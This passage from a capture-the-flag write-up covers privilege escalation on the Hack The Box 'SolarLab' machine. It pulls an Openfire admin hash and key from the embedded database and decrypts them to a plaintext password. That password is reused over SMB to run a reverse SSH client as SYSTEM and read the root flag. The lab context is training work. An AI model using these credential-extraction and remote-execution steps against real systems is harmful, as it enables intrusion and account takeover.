| 9a002c8242e3cee6321cb03f24e90cbda2ea49bd | public | SSH-v2.5.1-2-ga237613-windows_amd64 |
| 8731957ca24aa1ebfc8fa061e66a5633e0dd7a6c |        |                                     |
| solarlab.openfire.solarlab               |        |                                     |
| 10.129.119.197:56689                     |        |                                     |
+------------------------------------------+--------+-------------------------------------+

┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ ssh -J 127.0.0.1:443 solarlab.openfire.solarlab
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'solarlab.openfire.solarlab' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
solarlab\openfire
```

## From openfire to Administrator


### Enumeration

- Monitor file system changes
	- `Openfire logs location`
	- `Openfire embeded database location`

```bash
PS C:\Users\blake\Documents\app> $watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; $action = {$path = $even
t.SourceEventArgs.FullPath; $changetype = $event.SourceEventArgs.ChangeType; Write-Host "$(get-date) | $changetype | $path"}
PS C:\Users\blake\Documents\app> Register-ObjectEvent $watcher 'Changed' -Action $action
```

![](/assets/obsidian/1c759071740b41a24174822e59f43d80.png)

- Installed programs
	- `Openfire 4.7.4`

```bash
PS C:\Windows\system32> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.Publisher -ne "Microsoft Cor
poration"} | Select-Object InstallDate, DisplayName, DisplayVersion, Publisher, InstallLocation | sort InstallDate | ft -wrap

InstallDate DisplayName                DisplayVersion  Publisher                     InstallLocation
----------- -----------                --------------  ---------                     ---------------
            Openfire 4.7.4             4.7.4           Ignite Realtime RTC Community C:\Program Files\Openfire
[...]
```

### Openfire - Database : Discover Admin credential

`Openfire` on this machine is using embedded database

```bash
PS C:\Program Files\Openfire\conf> cat .\openfire.xml
<?xml version="1.0" encoding="UTF-8"?>
[...]
  <connectionProvider>
    <className>org.jivesoftware.database.EmbeddedConnectionProvider</className>
  </connectionProvider>
  <setup>true</setup>
  <fqdn>solarlab.htb</fqdn>
</jive>
```

The database contains `Administrator's` password hash

```bash
PS C:\Program Files\Openfire\embedded-db> ls


    Directory: C:\Program Files\Openfire\embedded-db


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/12/2024  11:12 AM                openfire.tmp
-a----         5/13/2024  12:22 PM             16 openfire.lck
-a----         5/13/2024  12:09 PM           1575 openfire.log
-a----         5/12/2024  11:12 AM            106 openfire.properties
-a----          5/7/2024   9:53 PM          16161 openfire.script


PS C:\Program Files\Openfire\embedded-db> cat .\openfire.script
[...]
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a9
4016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
[...]
```

### Openfire - Database : Decrypt user hashes

- Google : `openfire decrypt password from OFUSER`

> https://github.com/shakaw/openfire-password-decrypt

We need password hash (`encryptedPassword` column) from `ofUser` table, and the blow fish key (`select * from OFPROPERTY where name = 'passwordKey'`)

![](/assets/obsidian/12b39c70484d6d29070332ae35df692c.png)

Search for `passwordKey` in `C:\Program Files\Openfire\embedded-db\openfire.script`

![](/assets/obsidian/1b9c293e36ff3e3dbbb5e3bd8d054a97.png)

> Unfortunately the `php` script from the above **github** repo is not working, I will use another repo to decrypt the hash
> > https://github.com/c0rdis/openfire_decrypt
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab/exploit]
└─$ git clone https://github.com/c0rdis/openfire_decrypt

┌──(bravosec㉿fsociety)-[~/htb/SolarLab/exploit]
└─$ cd openfire_decrypt

┌──(bravosec㉿fsociety)-[~/htb/SolarLab/exploit/openfire_decrypt]
└─$ javac OpenFireDecryptPass.java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab/exploit/openfire_decrypt]
└─$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
```

### Password reuse

The credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -p 'ThisPasswordShouldDo!@'
SMB         10.129.119.197  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.119.197  445    SOLARLAB         [+] solarlab\Administrator:ThisPasswordShouldDo!@ (Pwn3d!)
```

Start reverse ssh client

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -p 'ThisPasswordShouldDo!@' -x '\programdata\client.exe'
SMB         10.129.119.197  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.119.197  445    SOLARLAB         [+] solarlab\Administrator:ThisPasswordShouldDo!@ (Pwn3d!)
```

Connect to the session

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.solarlab
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'nt.authority.system.solarlab' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
57f182299e78772461139e7ce052302c
```

# Additional
---
